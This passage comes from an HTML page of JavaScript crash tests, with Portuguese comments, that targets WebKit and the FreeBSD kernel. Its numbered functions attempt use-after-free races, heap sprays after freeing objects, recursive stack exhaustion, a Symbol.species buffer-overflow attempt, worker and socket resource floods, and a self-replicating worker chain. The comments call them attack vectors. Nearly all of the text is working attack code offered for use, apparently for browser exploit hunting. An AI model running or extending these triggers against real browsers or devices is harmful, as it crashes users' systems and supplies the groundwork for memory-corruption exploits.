            workers.forEach(function(wk){ wk.terminate(); });
            workers = [];
            if(document.fullscreenElement) document.exitFullscreen();
            else try{document.body.requestFullscreen()}catch(e){}
        }
    }, 30);
    
    setTimeout(function(){ clearInterval(i); workers.forEach(w=>w.terminate()); }, 5000);
}
// 67. XSLTProcessor Recursive Import Crash (WebKit)
// Vetor Exclusivo: XSLT (libxslt).
// Lógica: Usa o processador XSLT para transformar um XML. O XSLT contém
// imports recursivos ou templates que forçam o processador a consumir
// toda a stack C++ durante a compilação da folha de estilo.
function runTest67() {
    log("67. XSLT Recursion...");
    var parser = new DOMParser();
    var xmlString = "<root>data</root>";
    var xslString = `
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:apply-templates select="document('')/*/xsl:template"/>
        </xsl:template>
    </xsl:stylesheet>`;
    
    var xml = parser.parseFromString(xmlString, "text/xml");
    var xsl = parser.parseFromString(xslString, "text/xml");
    
    var proc = new XSLTProcessor();
    try {
        // Tenta importar a própria folha de estilo recursivamente
        proc.importStylesheet(xsl);
        
        // Loop de transformação para estressar a libxslt
        var i = 0;
        var t = setInterval(function() {
            var frag = proc.transformToFragment(xml, document);
            document.body.appendChild(frag);
            i++;
            if(i > 1000) { // Cleanup para evitar OOM lento
                document.body.textContent = "";
                i=0;
            }
        }, 5);
        setTimeout(function(){ clearInterval(t); }, 4000);
    } catch(e) { log(e); }
}

// 68. MathML Fraction Layout Overflow (WebKit)
// Vetor Exclusivo: MathML.
// Lógica: Cria estruturas matemáticas profundamente aninhadas (frações dentro de raízes).
// O motor de layout precisa calcular alturas e larguras combinadas.
// Sem JIT, o cálculo de layout recursivo pode causar integer overflow ou stack exhaustion.
function runTest68() {
    log("68. MathML Overflow...");
    var ns = "http://www.w3.org/1998/Math/MathML";
    var math = document.createElementNS(ns, "math");
    var current = math;
    
    // Aninhamento profundo de frações
    for(var i=0; i<2000; i++) {
        var frac = document.createElementNS(ns, "mfrac");
        var num = document.createElementNS(ns, "mn");
        num.textContent = "1";
        var den = document.createElementNS(ns, "mrow");
        
        frac.appendChild(num);
        frac.appendChild(den);
        current.appendChild(frac);
        current = den;
    }
    
    document.body.appendChild(math);
    
    // Força reflow síncrono
    try {
        var h = math.offsetHeight;
        // Mutação durante layout
        math.setAttribute("style", "font-size: 500px;");
        var w = math.offsetWidth;
        log("Math layout computed: " + w);
    } catch(e) { log(e); }
}

// 69. XMLSerializer Namespace Race (WebKit)
// Vetor Exclusivo: XML Serializer.
// Lógica: Cria elementos com namespaces conflitantes e tenta serializá-los
// enquanto altera seus atributos de definição de namespace (xmlns).
function runTest69() {
    log("69. XML Namespace Race...");
    var doc = document.implementation.createDocument(null, "root", null);
    var root = doc.documentElement;
    var child = doc.createElementNS("http://uri1", "p:child");
    root.appendChild(child);
    
    var s = new XMLSerializer();
    var iter = 0;
    
    var t = setInterval(function() {
        // Modifica namespaces
        child.setAttributeNS("http://www.w3.org/2000/xmlns/", "xmlns:p", "http://uri" + iter);
        
        try {
            // Serializa enquanto o DOM está "sujo"
            var str = s.serializeToString(doc);
            
            // Adiciona pressão de memória
            if(iter % 50 === 0) {
                var junk = new Array(100).fill(str);
            }
        } catch(e) {}
        iter++;
    }, 5);
    setTimeout(function(){ clearInterval(t); }, 4000);
}

// 70. WebSQL Transaction Locking Panic (Kernel)
// Vetor Exclusivo: SQLite (WebSQL).
// Lógica: O WebSQL usa arquivos SQLite no disco. Abrimos múltiplas transações
// concorrentes que tentam escrever na mesma tabela. Isso estressa o sistema
// de travamento de arquivo (file locking) do kernel FreeBSD.
function runTest70() {
    log("70. WebSQL Panic...");
    if(!window.openDatabase) { log("WebSQL not supported"); return; }
    
    var db = openDatabase('crash_db', '1.0', 'Crash Test', 2 * 1024 * 1024);
    db.transaction(function (tx) {
        tx.executeSql('CREATE TABLE IF NOT EXISTS stress (id unique, log)');
    });
    
    var i = setInterval(function() {
        // Dispara 20 transações simultâneas
        for(var k=0; k<20; k++) {
            db.transaction(function (tx) {
                var payload = "A".repeat(2048); // 2KB write
                tx.executeSql('INSERT INTO stress (id, log) VALUES (?, ?)', [Math.random(), payload]);
                // Tenta dropar a tabela no meio das inserções
                if(Math.random() > 0.9) {
                    tx.executeSql('DROP TABLE stress');
                }
            }, function(err){}, function(){});
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); }, 5000);
}

// 71. LocalStorage Sync VFS Race (Kernel)
// Vetor Exclusivo: LocalStorage (Sync I/O).
// Lógica: LocalStorage é síncrono. Escrevemos strings gigantes e limpamos
// imediatamente em um iframe. Isso cria uma condição de corrida na descarga (flush)
// do buffer do sistema de arquivos para o disco rígido.
function runTest71() {
    log("71. Storage VFS Race...");
    var key = "crash_key";
    var val = "X".repeat(1024 * 1024 * 2); // 2MB string
    
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var win = f.contentWindow;
    
    var i = setInterval(function() {
        try {
            // Thread A: Escreve massivamente
            localStorage.setItem(key, val);
            
            // Thread B (via Iframe): Limpa massivamente
            // O Kernel precisa sincronizar o arquivo de map do storage
            win.localStorage.clear();
            
            // Leitura para forçar verificação de consistência
            var check = localStorage.getItem(key);
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(i); document.body.removeChild(f); }, 4000);
}

// 72. Canvas Gradient Object UAF (Kernel/GPU)
// Vetor Exclusivo: Canvas Gradient Objects.
// Lógica: Cria objetos CanvasGradient, atribui ao contexto, desenha,
// e tenta manipular o objeto gradiente (adicionando stops) enquanto a GPU renderiza.
// Visa corromper a estrutura de memória do comando gráfico no driver.
function runTest72() {
    log("72. Gradient UAF...");
    var c = document.createElement('canvas');
    c.width = 1024; c.height = 1024;
    var ctx = c.getContext('2d');
    
    var i = setInterval(function() {
        // Cria gradiente
        var g = ctx.createLinearGradient(0, 0, 1024, 1024);
        g.addColorStop(0, 'red');
        g.addColorStop(1, 'blue');
        
        ctx.fillStyle = g;
        
        // Desenha geometria complexa
        ctx.beginPath();
        ctx.arc(512, 512, 500, 0, 2 * Math.PI);
        ctx.fill();
        
        // MUTAÇÃO: Adiciona stops no gradiente DEPOIS de atribuí-lo e DURANTE o desenho
        // Se o driver não fizer uma cópia profunda do objeto gradiente, isso causa crash.
        try {
            for(var k=0; k<100; k++) {
                g.addColorStop(Math.random(), 'green');
            }
            // Força flush do command buffer redimensionando
            c.width = (c.width === 1024) ? 1023 : 1024;
        } catch(e) {}
    }, 20);
    setTimeout(function(){ clearInterval(i); }, 4000);
}
// 79. WebCrypto Key Import/Export UAF (WebKit)
// Vetor Exclusivo: Web Cryptography API.
// Lógica: Gera uma chave criptográfica (RSA-OAEP) e tenta exportá-la.
// Durante o processo assíncrono de exportação (que ocorre em thread separada ou worker interno),
// tentamos destruir o contexto global ou corromper o objeto chave original.
function runTest79() {
    log("79. Crypto Race...");
    if(!window.crypto || !window.crypto.subtle) { log("No WebCrypto"); return; }
    
    var algo = { name: "RSA-OAEP", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: {name: "SHA-256"} };
    
    // Gera chave
    window.crypto.subtle.generateKey(algo, true, ["encrypt", "decrypt"])
    .then(function(keyPair) {
        // Inicia exportação pesada (PKCS8)
        var p = window.crypto.subtle.exportKey("pkcs8", keyPair.private);
        
        // Tenta invalidar a memória da chave imediatamente após o início da exportação
        keyPair.private = null;
        keyPair = null;
        
        // Alocação massiva para sobrescrever o slot da chave libertada
        var spray = [];
        for(var i=0; i<1000; i++) spray.push(new Uint8Array(4096));
        
        p.then(function(k) { log("Export success (Unexpected)"); })
         .catch(function(e) { log("Export err: " + e); });
    })
    .catch(function(e){ log(e); });
}

// 80. Intl.Collator Compare Mutator (WebKit)
// Vetor Exclusivo: Internationalization API (Intl).
// Lógica: O método `compare` do Collator chama `toString` nos objetos.
// Usamos um objeto com um getter malicioso que altera o array sendo ordenado
// enquanto o código C++ do Collator (ICU) está iterando sobre ele.
function runTest80() {
    log("80. Intl UAF...");
    if(!window.Intl) { log("No Intl"); return; }
    
    var collator = new Intl.Collator();
    var arr = ["a", "b", "c", "d"];
    
    var evil = {
        toString: function() {
            // Mutação destrutiva: Esvazia o array durante a comparação
            arr.length = 0;
            // Preenche heap
            var f = new Float64Array(1024);
            return "e";
        }
    };
    
    arr.push(evil);
    
    try {
        // Array.prototype.sort usa a função de comparação.
        // Se passarmos o compare do Collator, ele entra na libicu.
        arr.sort(collator.compare);
    } catch(e) { log(e); }
}

// 81. ReadableStream Tee Recursion Smash (WebKit)
// Vetor Exclusivo: Streams API.
// Lógica: Cria um ReadableStream e chama `tee()` recursivamente sobre os ramos resultantes.
// Isso cria uma árvore de streams interconectados que, ao tentar ler (cancelar),
// pode estourar a pilha de chamadas ou corromper o estado do controlador de fluxo.
function runTest81() {
    log("81. Stream Smash...");
    if(!window.ReadableStream) { log("No Streams"); return; }
    
    try {
        var rs = new ReadableStream({
            start(c) { c.enqueue("chunk"); }
        });
        
        var branches = [rs];
        // Tee recursivo
        for(var i=0; i<2000; i++) {
            var target = branches.shift();
            var res = target.tee(); // Retorna [branch1, branch2]
            branches.push(res[0], res[1]);
        }
        
        // Tenta cancelar tudo simultaneamente
        // O motor precisa propagar o cancelamento por milhares de nós
        branches.forEach(function(b) {
            b.cancel("boom").catch(e=>{});
        });
    } catch(e) { log(e); }
}

// 82. FormData Zero-Length Slice Panic (Kernel)
// Vetor Exclusivo: VFS Slice Handling.
// Lógica: Cria um Blob gigante, faz um slice de tamanho 0 ou inválido,
// anexa a um FormData e envia via XHR. Isso força o kernel a tentar ler
// 0 bytes de um vnode virtual, o que pode disparar asserts em drivers de sistema de arquivos.
function runTest82() {
    log("82. FormData Zero-Slice...");
    var data = new Uint8Array(1024*1024);
    var blob = new Blob([data]);
    
    // Slice patológico: Início > Fim ou Tamanho 0 no final do arquivo
    var badSlice = blob.slice(1024*1024, 1024*1024); 
    
    var fd = new FormData();
    fd.append("file", badSlice, "panic.bin");
    
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/upload_crash", true);
    
    // Envio massivo
    for(var i=0; i<50; i++) {
        try { xhr.send(fd); } catch(e) {}
        // Aborta imediatamente para estressar o cleanup do socket
        xhr.abort();
        xhr.open("POST", "/upload_crash_" + i, true);
    }
}

// 83. FileReaderSync Worker Revoke Race (Kernel)
// Vetor Exclusivo: FileReaderSync (apenas em Workers).
// Lógica: O FileReaderSync bloqueia a thread do Worker lendo um Blob.
// Na thread principal, revogamos o URL e destruímos o Blob enquanto o Worker está lendo.
// Isso tenta causar uma falha de página no kernel acessando memória desalocada.
function runTest83() {
    log("83. FileReaderSync Race...");
    var blob = new Blob([new Uint8Array(1024*1024*5)]); // 5MB
    var url = URL.createObjectURL(blob);
    
    var w = new Worker(URL.createObjectURL(new Blob([`
        onmessage = function(e) {
            try {
                var fr = new FileReaderSync();
                // Leitura síncrona bloqueante
                var res = fr.readAsArrayBuffer(e.data);
                postMessage("done");
            } catch(z){}
        }
    `], {type:'text/javascript'})));
    
    // 1. Inicia leitura no worker
    w.postMessage(blob);
    
    // 2. Janela crítica: Destrói o blob enquanto o kernel copia dados
    setTimeout(function() {
        blob = null; // GC hint
        URL.revokeObjectURL(url); // VFS hint
        w.terminate(); // Thread kill hint
        
        // Heap spray para preencher possível UAF
        var spray = []; 
        for(var k=0; k<20; k++) {
            spray.push(new ArrayBuffer(1024*1024));
        }
    }, 2);
}

// 84. XHR IPv6 Header Fragmentation Spray (Kernel)
// Vetor Exclusivo: Pilha de Rede (IPv6).
// Lógica: Envia requisições para endereços IPv6 locais (::1) com cabeçalhos HTTP gigantes.
// O objetivo é forçar a alocação de "mbuf clusters" para armazenar os cabeçalhos
// e causar fragmentação na memória reservada para pacotes de rede.
function runTest84() {
    log("84. IPv6 Header Spray...");
    var junk = "X".repeat(4000); // Quase o tamanho de um cluster (usually 2048 or 4096)
    var reqs = [];
    
    var i = setInterval(function() {
        try {
            var xhr = new XMLHttpRequest();
            // Endereço IPv6 força caminho de código diferente no kernel (netinet6)
            xhr.open("GET", "http://[::1]:8080/" + Math.random(), true);
            
            // Adiciona múltiplos headers grandes
            for(var h=0; h<20; h++) {
                xhr.setRequestHeader("X-Junk-" + h, junk);
            }
            
            xhr.send();
            reqs.push(xhr);
            
            if(reqs.length > 100) {
                reqs.shift().abort();
            }
        } catch(e) {}
    }, 10);
    
    setTimeout(function(){ clearInterval(i); }, 4000);
}
// 86. URLSearchParams Iterator Mutation Crash (WebKit)
// Vetor Exclusivo: URLSearchParams C++ Iterator.
// Lógica: Itera sobre parâmetros de URL. Modifica a lista subjacente (deletando chaves)
// exatamente quando o iterador interno avança, tentando invalidar o ponteiro do iterador.
function runTest86() {
    log("86. Params Iterator...");
    var params = new URLSearchParams();
    for(var i=0; i<2000; i++) params.append('key'+i, 'val'+i);
    
    var iter = params.entries();
    var count = 0;
    
    try {
        for(var pair of iter) {
            if(count === 100) {
                // Mutação massiva: Deleta as próximas 1000 chaves
                // O iterador C++ pode tentar acessar o próximo nó que foi libertado
                for(var k=100; k<1100; k++) params.delete('key'+k);
                
                // Spray para preencher
                var junk = new URLSearchParams();
                junk.append("A", "B".repeat(10000));
            }
            count++;
            if(count > 1500) break;
        }
    } catch(e) { log(e); }
}

// 87. CustomEvent Disconnected Subtree Path (WebKit)
// Vetor Exclusivo: Event Dispatcher em nós desconectados.
// Lógica: Dispara um CustomEvent em um nó que é movido entre DocumentFragments
// durante a fase de captura do evento. Confunde o cálculo do "Event Path".
function runTest87() {
    log("87. Event Path...");
    var frag = document.createDocumentFragment();
    var d1 = document.createElement('div');
    var d2 = document.createElement('div');
    frag.appendChild(d1);
    d1.appendChild(d2);
    
    var event = new CustomEvent('crash', {bubbles: true, cancelable: true});
    
    d1.addEventListener('crash', function() {
        // Remove d2 do fragmento e coloca em outro lugar
        // O evento ainda está propagando para d2
        frag.removeChild(d1);
        document.body.appendChild(d1);
        d1.removeChild(d2); // Isola d2
    }, {capture: true});
    
    try {
        // Dispara em d2 (target)
        d2.dispatchEvent(event);
        // Acesso pós-dispatch
        var path = event.composedPath();
        log("Path length: " + path.length);
    } catch(e) { log(e); }
}

// 88. PerformanceObserver Ring Buffer Overflow (Kernel/Resource)
// Vetor Exclusivo: Performance API (Shared Memory).
// Lógica: Inunda o buffer de eventos de performance a partir de um Worker.
// Isso estressa o mecanismo de IPC que comunica métricas entre o processo Web e o Kernel.
function runTest88() {
    log("88. Perf Overflow...");
    var w = new Worker(URL.createObjectURL(new Blob([`
        onmessage = function() {
            while(true) {
                // Gera milhares de entradas de performance por segundo
                performance.mark("mark-" + Math.random());
                performance.measure("mes", "mark-" + Math.random());
            }
        }
    `], {type:'text/javascript'})));
    
    var obs = new PerformanceObserver((list) => {
        // Tenta processar e limpar, mas pode não ser rápido o suficiente
        list.getEntries();
        performance.clearMarks();
        performance.clearMeasures();
    });
    obs.observe({entryTypes: ['mark', 'measure']});
    
    w.postMessage("start");
    
    // Toggle do observador para causar recriação de buffers internos
    var i = setInterval(function() {
        obs.disconnect();
        obs.observe({entryTypes: ['mark', 'measure']});
    }, 50);
    setTimeout(function(){ clearInterval(i); w.terminate(); }, 5000);
}

// 89. TypedArray Species Constructor Overflow (Kernel/VM)
// Vetor Exclusivo: Symbol.species hijacking.
// Lógica: Manipula o construtor de TypedArrays para retornar um buffer menor
// que o esperado durante operações de cópia (filter/map), tentando causar Buffer Overflow no heap.
function runTest89() {
    log("89. Species Overflow...");
    var size = 1024 * 16;
    var src = new Uint8Array(size);
    src.fill(0x41);
    
    // Hijack do construtor
    src.constructor = {
        [Symbol.species]: function(len) {
            // Retorna um buffer muito pequeno quando o motor pede 'len'
            return new Uint8Array(1);
        }
    };
    
    try {
        // 'map' espera criar um array do mesmo tamanho
        // Se a implementação C++ não verificar o tamanho do array retornado por species,
        // escreverá 16KB em um buffer de 1 byte.
        src.map(x => x); 
    } catch(e) { 
        log("Safe: " + e); 
    }
}

// 90. Sync XHR Worker Sigkill Socket Race (Kernel)
// Vetor Exclusivo: Sincronismo de Socket em Thread Morta.
// Lógica: Inicia um XHR Síncrono (bloqueante) em um Worker e mata o Worker imediatamente.
// O Kernel tenta fechar o socket de um processo/thread que já não existe ou está em teardown.
function runTest90() {
    log("90. Sync XHR Kill...");
    var url = URL.createObjectURL(new Blob([`
        onmessage = function() {
            var x = new XMLHttpRequest();
            // Request para um IP que não responde (timeout) força bloqueio longo
            x.open("GET", "http://192.0.2.1:80", false); 
            try { x.send(); } catch(e){}
        }
    `], {type:'text/javascript'}));
    
    var workers = [];
    var i = setInterval(function() {
        var w = new Worker(url);
        w.postMessage("go");
        workers.push(w);
        
        // Race condition: Terminar o worker enquanto ele está na syscall 'send' ou 'recv'
        if(workers.length > 10) {
            var dead = workers.shift();
            dead.terminate(); // Envia sinal de kill
        }
    }, 20); // Intervalo rápido
    
    setTimeout(function(){ clearInterval(i); }, 5000);
}
// 91. Document.open() Recursive Loader Smash (WebKit)
// Vetor Exclusivo: Document Loader State Machine.
// Lógica: Chama document.open/write dentro de um iframe que está sendo descarregado
// ou modificado. O objetivo é confundir o FrameLoader entre os estados "Loading", "Parsing" e "Committed".
// WebKit antigo tende a crashar se document.open() for chamado em um documento em destruição.
function runTest91() {
    log("91. Doc Loader Smash...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var d = f.contentDocument;
    
    var i = 0;
    function bomb() {
        if(i > 50) return;
        i++;
        try {
            // Recursão síncrona de escrita de documento
            d.open();
            d.write('<script>parent.bomb()<\/script>');
            d.close();
            
            // Interrompe o processo no meio
            if(i % 10 === 0) f.src = "about:blank";
            
            // Tenta escrever após navegar
            d.write("crash");
        } catch(e) {}
    }
    
    // Inicia o ciclo
    window.bomb = bomb;
    bomb();
    
    setTimeout(function() { document.body.removeChild(f); }, 2000);
}

// 92. TextDecoder Stream State Corruption (WebKit)
// Vetor Exclusivo: TextDecoder Streaming.
// Lógica: Usa TextDecoder com a opção {stream: true}. Decodifica pedaços parciais
// de caracteres multi-byte (UTF-8) enquanto modifica o buffer de entrada subjacente.
// Tenta corromper o estado interno do decodificador C++.
function runTest92() {
    log("92. Decoder Stream...");
    var dec = new TextDecoder("utf-8");
    var buf = new Uint8Array(1024);
    buf.fill(0xE2); // Início de caractere de 3 bytes
    
    try {
        // Enche o buffer interno do decoder com estado pendente
        for(var i=0; i<1000; i++) {
            // Passa dados incompletos para forçar bufferização interna
            var sub = buf.subarray(0, 2); 
            dec.decode(sub, {stream: true});
            
            // MUTAÇÃO: Altera o buffer original. 
            // Se o WebKit mantiver uma referência (zero-copy) em vez de copiar, isso corrompe a leitura.
            sub[0] = 0x41; 
        }
        
        // Finaliza abruptamente
        var res = dec.decode(new Uint8Array([0x80]), {stream: false});
        log("Decoded length: " + res.length);
    } catch(e) { log(e); }
}

// 93. ImageData Buffer Detach Race (WebKit)
// Vetor Exclusivo: Canvas ImageData & Workers.
// Lógica: Cria um ImageData, transfere seu buffer para um Worker (neutering),
// e tenta desenhá-lo no Canvas imediatamente. Explora a verificação de "detached buffer" no motor de renderização 2D.
function runTest93() {
    log("93. ImageData Detach...");
    var c = document.createElement('canvas');
    var ctx = c.getContext('2d');
    var img = ctx.createImageData(100, 100);
    
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){}'],{type:'text/javascript'})));
    
    // Loop de race condition
    var i = setInterval(function() {
        try {
            // Cria novo buffer válido
            var valid = new Uint8ClampedArray(40000);
            img.data.set(valid); // Tenta reviver (não funciona assim, mas estressa o objeto)
            
            // Race:
            // 1. Transfere buffer para worker (esvazia o lado do UI)
            w.postMessage(img.data.buffer, [img.data.buffer]);
            
            // 2. Tenta usar o ImageData esvaziado no motor gráfico
            ctx.putImageData(img, 0, 0);
            
            // Recria para proximo loop
            img = ctx.createImageData(100, 100);
        } catch(e) {}
    }, 5);
    
    setTimeout(function(){ clearInterval(i); w.terminate(); }, 4000);
}

// 94. VM Map Entry Exhaustion (Kernel)
// Vetor Exclusivo: mmap flood / VM Limits.
// Lógica: O Kernel FreeBSD tem um limite de entradas de mapa de memória por processo (`vm.max_map_entries`).
// Alocamos milhares de ArrayBuffers pequenos e distintos para esgotar essas entradas,
// depois tentamos uma syscall que requer alocação de memória (como criar thread ou socket).
function runTest94() {
    log("94. VM Map Flood...");
    var maps = [];
    var i = setInterval(function() {
        try {
            // Aloca buffers de tamanho específico para forçar páginas individuais (4KB)
            // Em sistemas sem JIT, isso pressiona o alocador 'malloc' ou 'mmap' diretamente
            for(var k=0; k<1000; k++) {
                maps.push(new ArrayBuffer(4096)); 
            }
        } catch(e) {
            log("Memory alloc failed (Good)");
            clearInterval(i);
            
            // GATILHO: Tenta uma operação de kernel com a tabela de mapas cheia
            try {
                var w = new Worker("data:text/javascript,"); // Requer nova stack (map entry)
            } catch(z) {
                log("Kernel refused resource: " + z);
            }
        }
        
        if(maps.length > 50000) { // Limpeza para não congelar UI totalmente
            maps.length = 0; 
            log("Flushing maps...");
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); }, 10000);
}

// 95. XHR Send Blob Slice Vnode Lock Race (Kernel)
// Vetor Exclusivo: File System Vnode Locking.
// Lógica: Envia fatias (slices) de um mesmo Blob via XHR concorrentemente.
// Ao fatiar um Blob baseado em arquivo/memória, o kernel cria referências ao vnode original.
// O envio simultâneo tenta causar contenção no bloqueio de leitura do vnode.
function runTest95() {
    log("95. Vnode Lock Race...");
    var data = new Uint8Array(1024*1024*2);
    var blob = new Blob([data]); // Blob em memória
    var reqs = [];
    
    var i = setInterval(function() {
        // Cria 20 requisições simultâneas lendo regiões diferentes do MESMO blob
        for(var k=0; k<20; k++) {
            var offset = Math.floor(Math.random() * (1024*1024));
            var slice = blob.slice(offset, offset + 4096);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "/dev/null", true);
            
            // O envio de Blob Slice ativa otimizações de VFS
            xhr.send(slice);
            reqs.push(xhr);
        }
        
        // Aborta metade para causar 'release' no vnode lock durante a leitura
        if(reqs.length > 100) {
            var kill = reqs.splice(0, 50);
            kill.forEach(x => x.abort());
        }
    }, 20);
    
    setTimeout(function(){ clearInterval(i); }, 5000);
}

// 96. Nested Worker Chain Kernel Stack Overflow (Kernel)
// Vetor Exclusivo: Process/Thread Kernel Stack.
// Lógica: Cria uma cadeia de Workers onde cada um cria outro (W1 -> W2 -> W3...).
// Diferente da recursão simples, isso cria threads reais aninhadas.
// Visa atingir o limite de profundidade de criação de threads ou estourar a pilha do kernel ao destruir a cadeia.
function runTest96() {
    log("96. Worker Chain...");
    
    // Código do worker que se auto-replica
    var code = `
        self.onmessage = function(e) {
            var depth = e.data;
            if(depth > 50) return; // Limite de segurança do teste
            try {
                var w = new Worker(self.location.href);
                w.postMessage(depth + 1);
            } catch(e) {}
        }
    `;
    
    var blob = new Blob([code], {type: 'text/javascript'});
    var url = URL.createObjectURL(blob);
    
    var w = new Worker(url);
    w.postMessage(0); // Inicia cadeia
    
    // A cadeia cresce silenciosamente em background.
    // Após alguns segundos, terminamos a raiz.
    // O kernel precisa limpar todas as threads filhas/órfãs em cascata.
    setTimeout(function() {
        log("Killing chain root...");
        w.terminate(); 
        
        // Tenta alocar algo imediatamente para aproveitar a instabilidade do scheduler
        var arr = new Uint32Array(1024*1024);
    }, 3000);
}
// 97. Reflect.construct Array Subclass UAF (WebKit)
// Vetor Exclusivo: Reflect API & Subclassing.
// Lógica: Usa Reflect.construct para criar um Array, mas define o "new.target" (o construtor alvo)
// para um Proxy. O Proxy intercepta a leitura de "prototype" durante a inicialização do objeto.
// Se alterarmos o estado do objeto antes dele estar totalmente construído, podemos causar crash.
function runTest97() {
    log("97. Reflect Construct...");
    var proxy = new Proxy(Array, {
        get: function(target, prop) {
            if (prop === 'prototype') {
                // Mutação durante a fase de construção
                // Retorna um protótipo que tenta executar código em um objeto não inicializado
                return {
                    get x() { throw "interrupt"; }
                };
            }
            return Reflect.get(target, prop);
        }
    });

    try {
        // Tenta construir um Array de tamanho gigante usando o proxy como alvo
        // O motor C++ aloca a estrutura, busca o prototype, e nós interrompemmos
        var arr = Reflect.construct(Array, [1024 * 1024], proxy);
        arr[0] = 1;
    } catch(e) { log(e); }
}

// 98. DOMAttrModified Recursive Event Smash (WebKit)
// Vetor Exclusivo: Legacy Mutation Events.
// Lógica: O evento DOMAttrModified (depreciado mas suportado) dispara síncronamente.
// Criamos um loop onde modificar um atributo dispara o evento, que modifica o atributo novamente.
// Isso consome a stack C++ e pode corromper o estado do Element se o motor não bloquear reentrância.
function runTest98() {
    log("98. Attr Event Smash...");
    var el = document.createElement('div');
    var count = 0;
    
    el.addEventListener('DOMAttrModified', function(e) {
        if(count > 2000) return;
        count++;
        // Recursão síncrona dentro do handler de evento
        // Modifica o mesmo atributo que disparou o evento
        try {
            el.setAttribute('id', 'val' + count);
            
            // Adiciona complexidade: remove e readiciona ao DOM
            if(count % 50 === 0) {
                document.body.appendChild(el);
                document.body.removeChild(el);
            }
        } catch(z) {}
    });
    
    document.body.appendChild(el);
    // Gatilho inicial
    el.setAttribute('id', 'start');
}

// 99. TreeWalker Filter Exception State Corruption (WebKit)
// Vetor Exclusivo: DOM Traversal Error Handling.
// Lógica: Usa um TreeWalker com um filtro personalizado que lança uma exceção.
// O objetivo é interromper a travessia (nextNode) de forma "suja", deixando o iterador
// interno apontando para um nó que manipulamos no bloco catch.
function runTest99() {
    log("99. Walker Exception...");
    var root = document.createElement('div');
    var c1 = document.createElement('span');
    var c2 = document.createElement('b');
    root.appendChild(c1);
    root.appendChild(c2);
    
    var walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node === c1) {
                // Lança exceção para desenrolar a stack do C++
                throw "Unwind"; 
            }
            return NodeFilter.FILTER_ACCEPT;
        }
    }, false);
    
    try {
        walker.nextNode(); // Deve lançar
    } catch(e) {
        // Estado inconsistente?
        // Remove o nó onde o walker "parou"
        root.removeChild(c1);
        
        // Tenta forçar o walker a continuar a partir de um ponteiro inválido
        try {
            var next = walker.nextNode();
            if(next) log("Walker advanced after exception!");
        } catch(z) {}
    }
}

// 100. IPv6 Hop-Limit Header Mbuf Corruption (Kernel)
// Vetor Exclusivo: IPv6 Socket Options (via XHR).
// Lógica: Envia requisições XHR para endereços IPv6 locais (::1) tentando definir
// cabeçalhos HTTP que podem ser interpretados ou processados de forma ineficiente
// pela pilha de rede, buscando esgotar mbufs de cabeçalho.
function runTest100() {
    log("100. IPv6 Mbuf Flood...");
    var pool = [];
    var i = setInterval(function() {
        try {
            var xhr = new XMLHttpRequest();
            // Loopback IPv6
            xhr.open("GET", "http://[::1]:1337/junk", true);
            
            // Payload em headers
            var junk = "X".repeat(1024);
            for(var h=0; h<10; h++) {
                xhr.setRequestHeader("X-Test-"+h, junk);
            }
            
            xhr.send();
            pool.push(xhr);
            
            // Mantém pressão na tabela de sockets e mbufs
            if(pool.length > 50) {
                var old = pool.shift();
                old.abort();
            }
        } catch(e) {}
    }, 10);
    setTimeout(function(){ clearInterval(i); }, 5000);
}

// 101. Worker Transferable Buffer Race (Kernel)
// Vetor Exclusivo: VM Page Ownership Transfer.
// Lógica: Cria um ArrayBuffer, transfere-o para um Worker (o que remove a referência da thread principal),
// mas tenta terminar o Worker e recriar o buffer no exato momento da transferência.
// Visa uma condição de corrida na gestão de páginas de memória virtual do kernel.
function runTest101() {
    log("101. Transfer Race...");
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){}'],{type:'text/javascript'})));
    
    var i = setInterval(function() {
        var ab = new ArrayBuffer(1024 * 1024 * 2); // 2MB
        try {
            // Janela crítica: PostMessage com Transferable
            w.postMessage(ab, [ab]);
            
            // Verifica se o buffer foi "desligado" (byteLength === 0)
            if(ab.byteLength !== 0) {
                log("Transfer failed?");
            }
            
            // Termina worker imediatamente para deixar o kernel limpando a página transferida
            w.terminate();
            
            // Respawn rápido
            w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){}'],{type:'text/javascript'})));
        } catch(e) {}
    }, 5);
    
    setTimeout(function(){ clearInterval(i); w.terminate(); }, 4000);
}

// 102. VM Map Fragmentation via Canvas Buffer (Kernel)
// Vetor Exclusivo: VM Map Fragmentation.
// Lógica: O objeto Canvas usa memória mapeada (shmem/mmap) para o buffer de pixels.
// Criamos canvases de tamanhos ligeiramente diferentes repetidamente.
// Isso fragmenta o espaço de endereçamento virtual (vm_map) do processo, podendo levar a um panic
// quando o kernel não consegue encontrar uma região contígua para a próxima alocação.
function runTest102() {
    log("102. VM Map Frag...");
    var canvases = [];
    
    var i = setInterval(function() {
        // Tamanhos primos ou ímpares para dificultar o alinhamento de páginas
        var w = 1000 + Math.floor(Math.random() * 100);
        var h = 1000 + Math.floor(Math.random() * 100);
        
        var c = document.createElement('canvas');
        c.width = w;
        c.height = h;
        
        // Força alocação do backing store
        var ctx = c.getContext('2d');
        ctx.fillRect(0,0,1,1);
        
        canvases.push(c);
        
        // Libera memória antiga mas deixa buracos no mapa
        if(canvases.length > 50) {
            var old = canvases.shift();
            old.width = 0; // Tenta liberar buffer
            old = null;
        }
    }, 10);
    
    setTimeout(function(){ clearInterval(i); canvases = []; }, 5000);
}

</script>
</body>
</html>